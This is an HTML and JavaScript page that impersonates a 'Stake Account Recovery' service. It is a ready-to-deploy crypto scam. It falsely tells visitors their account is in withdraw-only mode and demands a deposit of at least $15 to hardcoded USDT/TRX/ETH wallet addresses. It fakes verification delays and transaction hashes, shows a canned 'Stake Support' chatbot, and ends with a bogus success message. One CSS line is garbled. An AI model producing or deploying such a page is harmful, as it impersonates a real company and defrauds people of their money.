<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stake Account Recovery</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    body {
      background: radial-gradient(circle at top left, #1a2a3b, #0f212e);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      padding: 20px;
      transition: background 0.3s, color 0.3s;
    }
    .light-theme {
      background: #f0f0f0;
      color: #111;
    }
    .container {
      background: rgba(47, 69, 83, 0.9);
      backdrop-filter: blur(8px);
      padding: 25px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(2, 220, 5, 0.15);
      width: 100%;
      max-width: 480px;
      position: relative;
      z-index: 1;
      transition: background 0.3s;
    }
    .light-theme .container {
      background: #fff;
      color: #000;
    }
    .header {
      text-align: center;
      margin-bottom: 25px;
    }
    .header img {
      width: 120px;
      margin-bottom: 10px;
    }
    .header h2 {
      color: #02dc05;
      font-size: 1.8rem;
      font-weight: 600;
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      font-weight: 500;
      margin-bottom: 6px;
      display: block;
    }
    input, select {
      width: 100%;
      padding: 10px;
      background: #11232f;
      border: 2px solid transparent;
      border-radius: 8px;
      color: #fff;
      font-size: 0.95rem;
      transition: border 0.3s;
    }
    .light-theme input, .light-theme select {
      background: #e5e5e5;
      color: #111;
    }
    input:focus, select:focus {
      border: 2px solid #02dc05;
      outline: none;
    }
    .error {
      border: 2px solid #ff4444;
    }
    .error-message {
      color: #ff4444;
      font-size: 0.8rem;
      margin-top: 5px;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background: #02dc05;
      color: #0f212e;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    button:hover {
      box-shadow: 0 0 10px #02dc05, 0 0 20px #02dc05;
    }
    .copy-btn, .save-btn {
      margin-top: 10px;
      background-color: #166ae0;
      color: #fff;
    }
    .message {
      font-size: 0.9rem;
      color: #00ff9d;
      margin-top: 8px;
    }
    #qr-code-container {
      text-align: center;
      margin-top: 15px;
    }
    #qr {
      margin: 10px auto;
    }
    #popup, #processing {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: rgba(47, 69, 83, 0.95);
      color: #fff;
      padding: 25px;
      border-radius: 14px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      z-index: 9999;
      animation: fadeIn 0.4s ease;
      max-width: 90%;
      text-align: center;
    }
    .blur {
      filter: blur(5px);
      pointer-events: none;
      user-select: none;
    }
    .theme-toggle {
      position: fixed;
      top: 15px;
      right: 15px;
      background: #02dc05;
      color: #0f212e;
      border: none;
      padding: 8px;
      border-radius: 50%;
      font-size: 1rem;
      cursor: pointer;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
    }
    .chat-icon {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: #02dc05;
      color livestock: #0f212e;
      padding: 15px;
      border-radius: 50%;
      cursor: pointer;
      z-index: 999;
    }
    #chat-box {
      display: none;
      position: fixed;
      bottom: 80px;
      right: 20px;
      width: 280px;
      background: #1e2f3d;
      color: white;
      padding: 15px;
      border-radius: 12px;
      z-index: 1000;
      box-shadow: 0 0 10px #000;
      max-height: 400px;
      overflow-y: auto;
    }
    #chat-box p {
      margin-bottom: 10px;
      font-size: 0.9rem;
    }
    #chat-box .user-message {
      text-align: right;
      color: #02dc05;
    }
    #chat-box .bot-message {
      text-align: left;
      color: #00ff9d;
    }
    #chat-box .timestamp {
      font-size: 0.7rem;
      color: #aaa;
    }
    #chat-input {
      width: 100%;
      padding: 8px;
      margin-top: 10px;
      border-radius: 6px;
      border: none;
    }
    #chat-send {
      margin-top: 5px;
      background: #02dc05;
      color: #0f212e;
      width: 100%;
      border: none;
      border-radius: 6px;
      padding: 8px;
    }
    #progress-bar {
      width: 100%;
      height: 5px;
      background: #333;
      border-radius: 5px;
      overflow: hidden;
      margin-top: 10px;
    }
    #progress {
      width: 0;
      height: 100%;
      background: #02dc05;
      transition: width 3s linear;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95) translate(-50%, -50%); }
      to { opacity: 1; transform: scale(1) translate(-50%, -50%); }
    }
  </style>
</head>
<body>
  <button class="theme-toggle" onclick="toggleTheme()">ðŸŒ“</button>

  <div id="main-content" class="container">
    <div class="header">
      <img src="stake-logo-white.png" alt="Stake Logo" />
      <h2>Account Recovery</h2>
    </div>

    <div class="form-group">
      <label for="username">Username</label>
      <input type="text" id="username" placeholder="Enter Stake Username" oninput="checkUsername()" />
      <button id="verifyBtn" onclick="verifyUsername()" disabled>Verify</button>
      <div class="message" id="verify-msg"></div>
    </div>

    <div class="form-group">
      <label for="coin">Select Coin</label>
      <select id="coin" onchange="updateAddress()">
        <option value="">--Select Coin--</option>
        <option value="usdt">USDT</option>
        <option value="btc">BTC</option>
        <option value="trx">TRX</option>
        <option value="eth">Ethereum</option>
      </select>
    </div>

    <div class="form-group">
      <label for="network">Select Network</label>
      <select id="network" onchange="updateAddress()">
        <option value="">--Select Network--</option>
        <option value="trc20">TRC20</option>
        <option value="bsc">BSC</option>
      </select>
    </div>

    <div class="form-group">
      <label for="address">Wallet Address</label>
      <input type="text" id="address" readonly />
      <button class="copy-btn" onclick="copyAddress()">Copy</button>
      <div id="qr-code-container">
        <canvas id="qr"></canvas>
        <button class="save-btn" onclick="saveQR()">Save QR</button>
      </div>
    </div>

    <div class="form-group">
      <label for="amount">Enter Amount (USD)</label>
      <input type="number" id="amount" min="15" oninput="checkForm()" />
      <div class="error-message" id="amount-error"></div>
    </div>

    <div class="form-group">
      <label for="screenshot">Upload Screenshot</label>
      <input type="file" id="screenshot" onchange="previewImage(event)" />
      <div id="img-preview"></div>
    </div>

    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
  </div>

  <div id="processing">
    <p>Processing your request...</p>
    <div id="progress-bar"><div id="progress"></div></div>
  </div>
  <div id="popup">
    <p>YOUR ACCOUNT RECOVERY REQUEST HAS BEEN RECEIVED. WE HAVE FORWARDED YOUR QUERY TO THE STAKE TECHNICAL TEAM. YOUR STAKE ACCOUNT IS EXPECTED TO BE FULLY ACTIVE WITHIN 24 TO 72 HOURS.</p>
    <button onclick="location.reload()">OK</button>
  </div>

  <div class="chat-icon" onclick="toggleChat()">ðŸ’¬</div>
  <div id="chat-box">
    <p class="bot-message"><strong>Stake Support:</strong> Hello! How can we assist you today? <span class="timestamp"></span></p>
    <input type="text" id="chat-input" placeholder="Type your message..." />
    <button id="chat-send" onclick="sendMessage()">Send</button>
  </div>

  <script>
    const addressMap = {
      usdt: { trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA', bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
      btc: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
      trx: { trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA', bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
      eth: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' }
    };

    const qr = new QRious({ element: document.getElementById('qr'), size: 140 });

    function checkUsername() {
      const username = document.getElementById('username').value;
      const verifyBtn = document.getElementById('verifyBtn');
      verifyBtn.disabled = !username.trim();
      checkForm();
    }

    function updateAddress() {
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const addressField = document.getElementById('address');
      const helper = document.getElementById('verify-msg');
      if (coin && network && addressMap[coin] && addressMap[coin][network]) {
        const address = addressMap[coin][network];
        addressField.value = address;
        qr.value = address;
        if (coin === 'usdt' && network === 'trc20') {
          helper.innerText = 'Make sure to deposit only USDT via TRC20.';
        }
      } else {
        addressField.value = '';
        qr.value = '';
      }
      checkForm();
    }

    function verifyUsername() {
      const msg = document.getElementById('verify-msg');
      msg.innerHTML = 'Verifying...';
      setTimeout(() => {
        msg.innerHTML = 'YOUR STAKE ACCOUNT IS CURRENTLY IN WITHDRAW-ONLY MODE, RESTRICTING YOUR ABILITY TO DEPOSIT OR PLACE BETS. TO RESTORE FULL ACCESS AND RESUME ALL FUNCTIONALITIES, PLEASE DEPOSIT A MINIMUM OF $15. ONCE THE DEPOSIT IS COMPLETED, THE AMOUNT WILL BE CREDITED AUTOMATICALLY TO YOUR ACCOUNT AND YOUR ACCOUNT WILL FULLY RE-ACTIVED.';
        navigator.vibrate?.(100);
      }, 1500);
    }

    function copyAddress() {
      const address = document.getElementById('address');
      address.select();
      address.setSelectionRange(0, 99999);
      navigator.clipboard.writeText(address.value);
      alert('Address copied!');
    }

    function saveQR() {
      const qrCanvas = document.getElementById('qr');
      const link = document.createElement('a');
      link.href = qrCanvas.toDataURL();
      link.download = 'qr-code.png';
      link.click();
    }

    function previewImage(event) {
      const preview = document.getElementById('img-preview');
      preview.innerHTML = '';
      const file = event.target.files[0];
      if (file) {
        const img = document.createElement('img');
        img.src = URL.createObjectURL(file);
        img.style.maxWidth = '100%';
        preview.appendChild(img);
        const hash = document.createElement('p');
        hash.innerText = 'Txn Hash: 0x' + Math.random().toString(36).substring(2, 15);
        preview.appendChild(hash);
      }
      checkForm();
    }

    function checkForm() {
      const username = document.getElementById('username').value;
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const address = document.getElementById('address').value;
      const amount = parseFloat(document.getElementById('amount').value) || 0;
      const screenshot = document.getElementById('screenshot').files.length;
      const amountError = document.getElementById('amount-error');
      const amountInput = document.getElementById('amount');
      const submitBtn = document.getElementById('submitBtn');

      if (amount < 15) {
        amountInput.classList.add('error');
        amountError.innerText = 'Minimum amount is $15';
        submitBtn.disabled = true;
      } else {
        amountInput.classList.remove('error');
        amountError.innerText = '';
        submitBtn.disabled = !(username && coin && network && address && amount && screenshot);
      }
    }

    function submitForm() {
      const processing = document.getElementById('processing');
      const progress = document.getElementById('progress');
      processing.style.display = 'block';
      document.getElementById('main-content').classList.add('blur');
      progress.style.width = '100%';
      setTimeout(() => {
        processing.style.display = 'none';
        document.getElementById('popup').style.display = 'block';
        progress.style.width = '0';
      }, 3000);
    }

    function toggleTheme() {
      document.body.classList.toggle('light-theme');
      alert('Theme toggled!');
    }

    function toggleChat() {
      const box = document.getElementById('chat-box');
      box.style.display = box.style.display === 'block' ? 'none' : 'block';
      if (box.style.display === 'block') {
        updateTimestamps();
        box.scrollTop = box.scrollHeight;
      }
    }

    function updateTimestamps() {
      const timestamps = document.querySelectorAll('.timestamp');
      const now = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
      timestamps.forEach(ts => ts.textContent = now);
    }

    function sendMessage() {
      const input = document.getElementById('chat-input');
      const message = input.value.trim();
      const chatBox = document.getElementById('chat-box');
      const now = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });

      if (message) {
        const userMsg = document.createElement('p');
        userMsg.className = 'user-message';
        userMsg.innerHTML = `<strong>You:</strong> ${message} <span class="timestamp">${now}</span>`;
        chatBox.appendChild(userMsg);

        setTimeout(() => {
          let botReply = 'Thank you! Our support team will get back to you shortly.';
          if (message.toLowerCase().includes('deposit')) {
            botReply = 'Please use the wallet details provided in the form for deposits. Any other questions?';
          } else if (message.toLowerCase().includes('account')) {
            botReply = 'Complete the recovery form to restore your account. Let us know if you face any issues!';
          }
          const botMsg = document.createElement('p');
          botMsg.className = 'bot-message';
          botMsg.innerHTML = `<strong>Stake Support:</strong> ${botReply} <span class="timestamp">${now}</span>`;
          chatBox.appendChild(botMsg);
          chatBox.scrollTop = chatBox.scrollHeight;
        }, 1000);

        input.value = '';
        chatBox.scrollTop = chatBox.scrollHeight;
      }
    }
  </script>
</body>
</html>
